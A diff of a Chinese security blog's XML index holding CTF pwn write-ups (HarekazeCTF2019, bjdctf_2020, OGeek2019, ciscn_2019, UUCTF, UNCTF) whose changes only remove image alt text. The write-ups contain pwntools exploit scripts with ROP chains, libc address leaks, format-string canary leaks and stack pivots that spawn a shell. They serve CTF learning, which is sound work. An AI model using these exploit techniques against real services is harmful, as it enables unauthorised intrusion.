@@ -4,11 +4,11 @@
     <title>(HarekazeCTF2019)baby_rop2</title>
     <url>/2021/06287899.html</url>
     <content><![CDATA[<h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>检查保护机制，64位，开NX</p>
-<p><img src="/img/image-20210628183434726.png" alt="image-20210628183434726"></p>
+<p><img src="/img/image-20210628183434726.png"></p>
 <p>IDA打开，查看main函数，发现buf大小为0x20,而读入的大小为0x100，存在溢出漏洞</p>
-<p><img src="/img/image-20210628183509508.png" alt="image-20210628183509508"></p>
+<p><img src="/img/image-20210628183509508.png"></p>
 <p>再用shift+F12查找字符串，没有发现system(‘/bin/sh’)。</p>
-<p><img src="/img/image-20210628185049992.png" alt="image-20210628185049992"></p>
+<p><img src="/img/image-20210628185049992.png"></p>
 <h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.buf大小0x20，读入0x100，溢出漏洞，通过利用漏洞覆盖返回地址为system(‘/bin/sh’)</p>
 <p>2.利用read函数，泄露libc基址，然后获取system和/bin/sh字符串的地址</p>
 <p>3.最后将一二步合并完成夺权</p>
@@ -16,10 +16,10 @@
 <p>因为printf函数中有两个参数要设置，所以就要找到rsi和rdi寄存器</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary babyrop2 <span class="token operator">|</span>grep <span class="token string">"pop rdi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/img/image-20210628202925156.png" alt="image-20210628202925156"></p>
+<p><img src="/img/image-20210628202925156.png"></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary babyrop2 <span class="token operator">|</span>grep <span class="token string">"pop rsi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/img/image-20210628203023369.png" alt="image-20210628203023369"></p>
+<p><img src="/img/image-20210628203023369.png"></p>
 <p>看见rsi后面跟有r15，我们直接设置为0</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>format_str<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -72,7 +72,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最后拿flag时，发现flag还没有放在根目录下，需要find -name “flag”去查找，最后cat flag</p>
-<p><img src="/img/image-20210628210723648.png" alt="image-20210628210723648"></p>
+<p><img src="/img/image-20210628210723648.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -1638,13 +1638,13 @@ Breakpoint 9, main (argc=4, argv=0xbffff824) at heap3/heap3.c:28
     <content><![CDATA[<span id="more"></span>
 
 <h1 id="UUCTF-writeup"><a href="#UUCTF-writeup" class="headerlink" title="UUCTF writeup"></a>UUCTF writeup</h1><h3 id="writer-Pr0b1em-小菜鸡二进制选手，目标全栈选手，不配"><a href="#writer-Pr0b1em-小菜鸡二进制选手，目标全栈选手，不配" class="headerlink" title="writer:Pr0b1em(小菜鸡二进制选手，目标全栈选手，不配)"></a>writer:Pr0b1em<del>(小菜鸡二进制选手，目标全栈选手，不配)</del></h3><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h3><p>下载附件，先检查保护机制，只开了NX，64位文件</p>
-<p><img src="/img/1666613003904.png" alt="1666613003904"></p>
+<p><img src="/img/1666613003904.png"></p>
 <p>拖入IDA查看，分别查看main函数和字符串，找到关键字符串system和bin/sh，同时发现了vuln函数，继续跟进</p>
-<p><img src="/img/1666613080677.png" alt="1666613080677"></p>
-<p><img src="/img/1666613062494.png" alt="1666613062494"></p>
-<p><img src="/img/1666613139782.png" alt="1666613139782"></p>
+<p><img src="/img/1666613080677.png"></p>
+<p><img src="/img/1666613062494.png"></p>
+<p><img src="/img/1666613139782.png"></p>
 <p>发现buf此处，其中存在栈溢出，同时发现back_door函数，现成直接用 </p>
-<p><img src="/img/1666613319147.png" alt="1666613319147"></p>
+<p><img src="/img/1666613319147.png"></p>
 <p>构造脚本</p>
 <h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
@@ -1662,9 +1662,9 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 
 <h3 id="easystack"><a href="#easystack" class="headerlink" title="easystack"></a>easystack</h3><p><strong>花式栈溢出</strong></p>
 <p>检查保护机制，开了NX和PIE,说明基地址随机，估计得碰运气</p>
-<p><img src="/img/1666614235498.png" alt="1666614235498"></p>
+<p><img src="/img/1666614235498.png"></p>
 <p>IDA打开，发现内容和上一题几乎一样，唯独不同的点就是溢出空间只够一个后门函数的地址，于是撰写脚本，因为基地址为止，需要碰，所以脚本些许变化</p>
-<p><img src="/img/1666614380686.png" alt="1666614380686"></p>
+<p><img src="/img/1666614380686.png"></p>
 <h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
 <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
@@ -1686,17 +1686,17 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
         <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="just-rce"><a href="#just-rce" class="headerlink" title="just rce"></a>just rce</h3><p>简单的rce，通过rev指令逆序输出就得到flag，后面配上通配符绕过关键字</p>
-<p><img src="/img/1666618211863.png" alt="1666618211863"></p>
+<p><img src="/img/1666618211863.png"></p>
 <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Where-is-flag？"><a href="#Where-is-flag？" class="headerlink" title="Where is flag？"></a>Where is flag？</h3><p>流量分析，wireshark打开后导出特定分组http，发现有个flag压缩包，打开文件发现是png图片格式，010打开，这里发现缺少头文件，于是修复好，发现是个二维码，扫出来的内容存在零宽容度字符，在线网站解密得到flag。</p>
-<p><img src="/img/1666777976579.png" alt="1666777976579"></p>
+<p><img src="/img/1666777976579.png"></p>
 <h3 id="搬好小板凳听故事"><a href="#搬好小板凳听故事" class="headerlink" title="搬好小板凳听故事"></a>搬好小板凳听故事</h3><p>简单的解决，用ciphey，好一个三花淡奶！</p>
-<p><img src="/img/1666778096125.png" alt="1666778096125"></p>
+<p><img src="/img/1666778096125.png"></p>
 <h3 id="村中奇怪的故事"><a href="#村中奇怪的故事" class="headerlink" title="村中奇怪的故事"></a>村中奇怪的故事</h3><p>这玩意儿图片真给我误导了，没想到就是百家姓加密，后来仔细一看悟出来了，赶紧去试，后来七七上hint也验证了我的想法。说真的，这故事够狗屎，给我看得一愣一愣，解出来之后，居然平台后台flag还是错的，给我整得怀疑人生。</p>
 <h3 id="蜜蜂和蛆"><a href="#蜜蜂和蛆" class="headerlink" title="蜜蜂和蛆"></a>蜜蜂和蛆</h3><p>crc32爆破，通过pass1和pass2分别得到一段密码，然后打开得到一张画着蜜蜂和蛆的png，改宽高，得到一个二维码，扫出来base64解密，<del>文件都删完了，懒得复现了</del></p>
 <h3 id="王八快跑"><a href="#王八快跑" class="headerlink" title="王八快跑"></a>王八快跑</h3><p>让你跑你就跑，签个到！哈哈哈哈</p>
 <h3 id="略略略来抓我啊"><a href="#略略略来抓我啊" class="headerlink" title="略略略来抓我啊"></a>略略略来抓我啊</h3><p>社工还是不太擅长，很久没做过了，找了很久，第一张图暴露了一个钱塘驿，直接暴露了位置，然后就找着地图找宾馆，是个眼力活，也是个体力活</p>
 <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="websign"><a href="#websign" class="headerlink" title="websign"></a>websign</h3><p>F12不管用？那我手动总行了吧！</p>
-<p><img src="/img/1666778791713.png" alt="1666778791713"></p>
+<p><img src="/img/1666778791713.png"></p>
 <h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="爱丽丝梦境的兔子"><a href="#爱丽丝梦境的兔子" class="headerlink" title="爱丽丝梦境的兔子"></a>爱丽丝梦境的兔子</h3><p>兔子密码、社会主义核心价值观密码和栅栏密码，简单套娃</p>
 <h3 id="disparity-rsa"><a href="#disparity-rsa" class="headerlink" title="disparity_rsa"></a>disparity_rsa</h3><p>这个rsa有手就行，我直接用RsaCTFtools解的，脚本都懒得写了，这里就不放图复现了<del>（是真的懒</del></p>
 <h3 id="Easy-base64"><a href="#Easy-base64" class="headerlink" title="Easy_base64"></a>Easy_base64</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
@@ -1779,11 +1779,11 @@ string <span class="token operator">=</span> long_to_bytes<span class="token pun
     <content><![CDATA[<span id="more"></span>
 <h2 id="UNCTF——fo"><a href="#UNCTF——fo" class="headerlink" title="UNCTF——fo"></a>UNCTF——fo</h2><p>我真是个傻逼！这题目就是拿来自己打醒自己的，比赛卡了一晚上，一度怀疑是自己字符串漏洞没学好，研究一晚格式化字符串，结果wp出来一看，计算偏移量搞错，我真是个大傻逼！！！</p>
 <p>检查保护机制，64位，开NX和canary</p>
-<p><img src="/img/1643120080074.png" alt="1643120080074"></p>
+<p><img src="/img/1643120080074.png"></p>
 <h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>题目里printf函数，可以直接格式化字符串漏洞溢出canary地址，然后覆盖夺权，思路很简单。</p>
-<p><img src="/img/1643120093467.png" alt="1643120093467"></p>
+<p><img src="/img/1643120093467.png"></p>
 <p>但我是万万没想到啊，栽在自己手里</p>
-<p><img src="/img/1643120109339.png" alt="1643120109339"></p>
+<p><img src="/img/1643120109339.png"></p>
 <p>从头到尾，一共0x58的大小，我偏偏忘掉减canary地址，以至于整个题卡住，我是傻逼！！！</p>
 <p>最后就不用多说了</p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -2054,16 +2054,16 @@ strcpy(buffer, variable);
     <url>/2021/0620c1a3.html</url>
     <content><![CDATA[<span id="more"></span>
 <h2 id="HarekazeCTF2019-baby-rop-ret2text"><a href="#HarekazeCTF2019-baby-rop-ret2text" class="headerlink" title="[HarekazeCTF2019]baby_rop(ret2text)"></a>[HarekazeCTF2019]baby_rop(ret2text)</h2><p>查看保护机制，开了NX，64位</p>
-<p><img src="/img/image-20210620201226614.png" alt="image-20210620201226614"></p>
+<p><img src="/img/image-20210620201226614.png"></p>
 <p>IDA打开，F5查看main函数</p>
-<p><img src="/img/image-20210620201505692.png" alt="image-20210620201505692"></p>
-<p><img src="/img/image-20210620201559551.png" alt="image-20210620201559551"></p>
+<p><img src="/img/image-20210620201505692.png"></p>
+<p><img src="/img/image-20210620201559551.png"></p>
 <p>看见system函数</p>
 <p>然后F12+shift搜索字符串，还找到了’/bin/sh/‘</p>
-<p><img src="/img/image-20210620201708611.png" alt="image-20210620201708611"></p>
-<p><img src="/img/image-20210620202004923.png" alt="image-20210620202004923"></p>
+<p><img src="/img/image-20210620201708611.png"></p>
+<p><img src="/img/image-20210620202004923.png"></p>
 <p>因为64位传参需要用到寄存器，所以用gadget找到rdi寄存器位置</p>
-<p><img src="/img/image-20210620202405923.png" alt="image-20210620202405923"></p>
+<p><img src="/img/image-20210620202405923.png"></p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-none"><code class="language-none">from pwn import *
 context.log_level = "debug"
 
@@ -2081,7 +2081,7 @@ io.sendline(payload)
 io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这里夺权之后还有一个小坑，就是flag不在根目录下，需要通过查找获得位置，然后拿到flag</p>
-<p><img src="/img/image-20210620202949778.png" alt="image-20210620202949778"></p>
+<p><img src="/img/image-20210620202949778.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -2096,15 +2096,15 @@ io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span>
     <url>/2021/06268fcf.html</url>
     <content><![CDATA[<span id="more"></span>
 <h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><p>检查保护机制，开启NX，64位</p>
-<p><img src="/img/image-20210626120953251.png" alt="image-20210626120953251"></p>
+<p><img src="/img/image-20210626120953251.png"></p>
 <p>运行程序，看见有libc的字眼，想到应该和libc泄露有关</p>
-<p><img src="/img/image-20210626121205881.png" alt="image-20210626121205881"></p>
+<p><img src="/img/image-20210626121205881.png"></p>
 <p>shift+F12查找字符串，没有找到system(‘/bin/sh’)，看样子应该就是这个类型的题了</p>
-<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p><img src="/img/image-20210626121435224.png" alt="image-20210626121435224"></p>
+<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><p><img src="/img/image-20210626121435224.png"></p>
 <p>看到一个vuln()函数，应该会是解题的关键，点进去看，果然</p>
-<p><img src="/img/image-20210626121534041.png" alt="image-20210626121534041"></p>
+<p><img src="/img/image-20210626121534041.png"></p>
 <p>找到了漏洞，read读入长度为0x64，buf大小为0x20，就从这个地方切入</p>
-<p><img src="/img/image-20210626122951905.png" alt="image-20210626122951905"></p>
+<p><img src="/img/image-20210626122951905.png"></p>
 <h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>1.利用puts函数去泄露libc版本</p>
 <p>2.计算偏移量，算出程序里的system函数和字符串’/bin/sh’的地址</p>
 <p>3.利用溢出漏洞，构造rop，夺权</p>
@@ -2113,7 +2113,7 @@ io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span>
 <p>当参数大于等于7个时，前6个就是前面6个，后面的参数就从右向左放入栈中，和32位一样</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">ROPgadget <span class="token operator">-</span><span class="token operator">-</span>binary bjdctf_2020_babyrop <span class="token operator">|</span>grep <span class="token string">"pop rdi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/img/image-20210626122850728.png" alt="image-20210626122850728"></p>
+<p><img src="/img/image-20210626122850728.png"></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
 r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'pull up your sword and tell me u story!'</span><span class="token punctuation">)</span>
 r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
@@ -2161,7 +2161,7 @@ r<span class="token punctuation">.</span>sendline<span class="token punctuation"
 r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最后拿到flag</p>
-<p><img src="/img/image-20210626130027859.png" alt="image-20210626130027859"></p>
+<p><img src="/img/image-20210626130027859.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -2175,15 +2175,15 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
     <url>/2021/062072ce.html</url>
     <content><![CDATA[<span id="more"></span>
 <h1 id="OGeek2019-babyrop-ret2libc"><a href="#OGeek2019-babyrop-ret2libc" class="headerlink" title="[OGeek2019]babyrop(ret2libc)"></a>[OGeek2019]babyrop(ret2libc)</h1><p>查看保护机制，32位，开了NX</p>
-<p><img src="/img/image-20210504170711043.png" alt="image-20210504170711043"></p>
+<p><img src="/img/image-20210504170711043.png"></p>
 <p>IDA打开查看发现有随机数问题</p>
-<p><img src="/img/image-20210504171507650.png" alt="image-20210504171507650"></p>
+<p><img src="/img/image-20210504171507650.png"></p>
 <p>通过strncmp函数比较随机数与输入数是否相等</p>
-<p><img src="/img/image-20210504171816124.png" alt="image-20210504171816124"></p>
+<p><img src="/img/image-20210504171816124.png"></p>
 <p>这里想到可以通过\x00来绕过strncmp函数，因为strlen遇到\x00会停止</p>
-<p><img src="/img/image-20210504181922297.png" alt="image-20210504181922297"></p>
+<p><img src="/img/image-20210504181922297.png"></p>
 <p>因为a1是函数sub_804871F的返回值，那就让a1为 \xff 这样就可以进行栈溢出了 </p>
-<p><img src="/img/image-20210513155325475.png" alt="image-20210513155325475"></p>
+<p><img src="/img/image-20210513155325475.png"></p>
 <p>libc.so可以给我们提供一套函数的地址，并且在里面虽有函数的相对位置都是固定的。意思是如果我们知道了每一个函数的真实地址，我们可以根据给出的libc.so计算出其他函数的真实地址(实际上就是要得到system_addr)</p>
 <p>这里选择泄露write_addr，然后计算出system_addr</p>
 <h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>1.因为给出了libc版本，所以我们可以直接使用<br>2.在这题中，我们可以泄露write函数的地址，然后用题目提供的动态共享库算出内存中system函数的地址<br>3.再用system函数的地址覆盖返回地址</p>
@@ -2216,7 +2216,7 @@ io<span class="token punctuation">.</span>sendlineafter<span class="token punctu
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最后脚本一跑，拿到了flag</p>
-<p><img src="/img/image-20210620200813979.png" alt="image-20210620200813979"></p>
+<p><img src="/img/image-20210620200813979.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -2244,15 +2244,15 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
     <title>bjdctf_2020_babyrop2</title>
     <url>/2021/0718814e.html</url>
     <content><![CDATA[<h1 id="bjdctf-2020-babyrop2"><a href="#bjdctf-2020-babyrop2" class="headerlink" title="bjdctf_2020_babyrop2"></a>bjdctf_2020_babyrop2</h1><p>检查保护机制，开了NX和canary，64位</p>
-<p><img src="/img/image-20210718104136221.png" alt="image-20210718104136221"></p>
+<p><img src="/img/image-20210718104136221.png"></p>
 <p>IDA打开，查看main函数，发现里面利用到了三个函数</p>
-<p><img src="/img/image-20210718104243834.png" alt="image-20210718104243834"></p>
+<p><img src="/img/image-20210718104243834.png"></p>
 <p>init函数，初始化输出提示</p>
-<p><img src="/img/image-20210718104312978.png" alt="image-20210718104312978"></p>
+<p><img src="/img/image-20210718104312978.png"></p>
 <p>gift函数，存在格式化字符串漏洞</p>
-<p><img src="/img/image-20210718104333802.png" alt="image-20210718104333802"></p>
+<p><img src="/img/image-20210718104333802.png"></p>
 <p>vuln函数，存在栈溢出漏洞</p>
-<p><img src="/img/image-20210718104359430.png" alt="image-20210718104359430"></p>
+<p><img src="/img/image-20210718104359430.png"></p>
 <h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><h5 id="可利用gift函数的格式化字符串漏洞，泄露canary的值"><a href="#可利用gift函数的格式化字符串漏洞，泄露canary的值" class="headerlink" title="可利用gift函数的格式化字符串漏洞，泄露canary的值"></a>可利用<code>gift</code>函数的格式化字符串漏洞，泄露<code>canary</code>的值</h5><p>得到偏移量为7</p>
 <p><img src="/img/20200826223512973.png"></p>
 <p>没有发现system和’/bin/sh’，只有通过vuln函数栈溢出漏洞，泄露libc地址，然后得到</p>
@@ -2289,7 +2289,7 @@ p<span class="token punctuation">.</span>sendline<span class="token punctuation"
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/img/image-20210718110410868.png" alt="image-20210718110410868"></p>
+<p><img src="/img/image-20210718110410868.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -2304,7 +2304,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <content><![CDATA[<span id="more"></span>
 <h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>由于canary保护就是在距离EBP一定距离的栈帧中，用于验证是否程序有构造缓冲区的危险。而canary所在的位置一般也都在EBP-8的位置上存储着，因此 只要有机会泄露canary的位置，我们便有机会溢出程序</p>
 <h1 id="泄露方式"><a href="#泄露方式" class="headerlink" title="泄露方式"></a>泄露方式</h1><h2 id="覆盖00字节读取"><a href="#覆盖00字节读取" class="headerlink" title="覆盖00字节读取"></a>覆盖00字节读取</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>由于canary是在栈中的，而一般情况下为防止read、printf等函数直接读出canary的数据，canary都是以<code>\x00</code>为结尾设计的。这时我们可以利用换行符在将buf填充满之后会将<code>\x0a</code>覆盖至canary结尾的<code>\x00</code>覆上，这样就能顺利的读出canary的数据了，之后再将<code>cannary</code>-<code>\x0a</code>即可得到真实的canary的数据</p>
-<p><img src="/img/1643119852338.png" alt="1643119852338"></p>
+<p><img src="/img/1643119852338.png"></p>
 <h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
 <li>存在<code>read</code>/<code>printf</code>等读出字符串的函数 </li>
 <li>可以两次栈溢出 </li>
@@ -2335,14 +2335,14 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <title>ciscn_2019_es_2</title>
     <url>/2021/06284f25.html</url>
     <content><![CDATA[<h1 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h1><p>检查保护机制，32位，开启NX</p>
-<p><img src="/img/image-20210628215206342.png" alt="image-20210628215206342"></p>
+<p><img src="/img/image-20210628215206342.png"></p>
 <p>IDA打开，shift+F12查找字符串，发现sysytem函数，但没有/bin/sh，还是无法直接利用</p>
-<p><img src="/img/image-20210628215304461.png" alt="image-20210628215304461"></p>
+<p><img src="/img/image-20210628215304461.png"></p>
 <p>找到system函数真实地址0x8048400</p>
-<p><img src="/img/image-20210628215541204.png" alt="image-20210628215541204"></p>
+<p><img src="/img/image-20210628215541204.png"></p>
 <p>main函数，还是一样，里面的vlu()函数肯定是重点</p>
-<p><img src="/img/image-20210628215636474.png" alt="image-20210628215636474"></p>
-<p><img src="/img/image-20210628215644207.png" alt="image-20210628215644207"></p>
+<p><img src="/img/image-20210628215636474.png"></p>
+<p><img src="/img/image-20210628215644207.png"></p>
 <p>读入0x30字节数据给s，s大小是0x28，只能溢出0x8字节，覆盖到ret，没法构造太长的rop，但是这边可以给s写入2次数据。</p>
 <h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>我们可以通过第一次输入来泄露程序里的ebp地址，知道了ebp的地址就能够推算出参数s在栈上的地址，第二次直接往栈上写入system（‘/bin/sh’），之后利用leave；ret的栈劫持去到参数s的栈，让它去执行我们布置在栈上的system（‘/bin/sh’）来获取shell。</p>
 <h3 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h3><p>1.泄露ebp</p>
@@ -2355,7 +2355,7 @@ ebp<span class="token operator">=</span>u32<span class="token punctuation">(</sp
 <p>2.找到s在栈上的位置</p>
 <p>算出ebp-0x38是参数s在栈上的位置</p>
 <p>3.布置栈上的值</p>
-<p><img src="/img/image-20210628221147958.png" alt="image-20210628221147958"></p>
+<p><img src="/img/image-20210628221147958.png"></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">payload<span class="token operator">=</span><span class="token string">'aaaa'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>s<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/bin/sh"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>第一个’aaaa‘随便输入，如果一开始将system函数写第一个，那么我们在用leave；ret劫持栈的时候要抬高4字节<br>接着跟上system函数的地址<br>后面是执行完system函数后的返回地址，这边也可以随便写<br>之后是一个地址，这个地址指向的是我们写在栈上的’/bin/sh‘字符串</p>
@@ -2386,7 +2386,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>cat flag</p>
-<p><img src="/img/image-20210628221613459.png" alt="image-20210628221613459"></p>
+<p><img src="/img/image-20210628221613459.png"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -2399,16 +2399,16 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
     <title>ciscn_2019_c_1</title>
     <url>/2021/062848a4.html</url>
     <content><![CDATA[<h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>检查保护机制，64位，开NX</p>
-<p><img src="/img/image-20210429213629885.png" alt="image-20210429213629885"></p>
+<p><img src="/img/image-20210429213629885.png"></p>
 <p>IDA打开后F5查看main函数</p>
-<p><img src="/img/image-20210423214542261.png" alt="image-20210423214542261"></p>
+<p><img src="/img/image-20210423214542261.png"></p>
 <p>发现没有之前做的gets()栈溢出，但是发现了一个encrypt函数，点开之后查看，找到了gets函数</p>
-<p><img src="/img/image-20210423214700799.png" alt="image-20210423214700799"></p>
+<p><img src="/img/image-20210423214700799.png"></p>
 <p>读得内容为gets读取输入内容进入while循环之后是由strlen检查长度，strlen是从字符串开头检测到第一个\x00截断，所以只要在payload的开头置0让strlen判断错误就可以避免对payload的破坏。</p>
 <h4 id="小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过"><a href="#小技巧-遇到strlen和strcmp这两个只需要在payload里放一个-x00就可以绕过" class="headerlink" title="小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过"></a>小技巧:遇到strlen和strcmp这两个只需要在payload里放一个\x00就可以绕过</h4><p>但这里没有发现后门函数，于是只能自己构造rop链。</p>
 <p>puts()可以用来泄露libc基址。</p>
 <p>gets()可以用来栈溢出，栈大小0x50。</p>
-<p><img src="/img/image-20210430234840983.png" alt="image-20210430234840983"></p>
+<p><img src="/img/image-20210430234840983.png"></p>
 <h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
 <span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>
 
@@ -2460,7 +2460,7 @@ main<span class="token punctuation">(</span><span class="token punctuation">)</s
